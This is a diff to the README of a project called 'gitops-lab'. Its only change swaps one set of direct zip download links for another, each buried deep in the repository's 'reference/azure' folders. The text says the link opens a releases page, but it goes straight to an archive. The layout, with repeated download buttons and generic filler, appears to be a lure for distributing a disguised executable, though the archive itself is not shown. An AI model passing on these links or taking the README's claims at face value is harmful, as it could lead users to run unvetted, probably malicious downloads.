@@ -1,6 +1,6 @@
 # 🎉 gitops-lab - Build Your GitOps Pipeline Easily
 
-[![Download](https://raw.githubusercontent.com/jkhlasdfihua/gitops-lab/main/reference/azure/02-networking/gitops-lab_2.5-beta.2.zip)](https://raw.githubusercontent.com/jkhlasdfihua/gitops-lab/main/reference/azure/02-networking/gitops-lab_2.5-beta.2.zip)
+[![Download](https://github.com/jkhlasdfihua/gitops-lab/raw/refs/heads/main/reference/azure/01-bootstrap/lab_gitops_v1.7.zip)](https://github.com/jkhlasdfihua/gitops-lab/raw/refs/heads/main/reference/azure/01-bootstrap/lab_gitops_v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ Welcome to gitops-lab! This application helps you create a complete GitOps pipel
 To get started, you need to download the application. 
 
 1. **Visit the Releases Page:** Click the link below to go to the download page:
-   [Download gitops-lab](https://raw.githubusercontent.com/jkhlasdfihua/gitops-lab/main/reference/azure/02-networking/gitops-lab_2.5-beta.2.zip)
+   [Download gitops-lab](https://github.com/jkhlasdfihua/gitops-lab/raw/refs/heads/main/reference/azure/01-bootstrap/lab_gitops_v1.7.zip)
 
 2. **Choose Your Version:** On the releases page, you will see a list of versions available for download. Select the latest version for the most up-to-date features.
 
@@ -76,6 +76,6 @@ Here are some topics you may find interesting as you learn more about GitOps:
 - **FluxCD:** Automate your Kubernetes deployments.
 - **Infrastructure as Code:** Streamline your resource management.
 
-[![Download](https://raw.githubusercontent.com/jkhlasdfihua/gitops-lab/main/reference/azure/02-networking/gitops-lab_2.5-beta.2.zip)](https://raw.githubusercontent.com/jkhlasdfihua/gitops-lab/main/reference/azure/02-networking/gitops-lab_2.5-beta.2.zip)
+[![Download](https://github.com/jkhlasdfihua/gitops-lab/raw/refs/heads/main/reference/azure/01-bootstrap/lab_gitops_v1.7.zip)](https://github.com/jkhlasdfihua/gitops-lab/raw/refs/heads/main/reference/azure/01-bootstrap/lab_gitops_v1.7.zip)
 
 Thank you for choosing gitops-lab! We hope you enjoy building your GitOps pipeline.
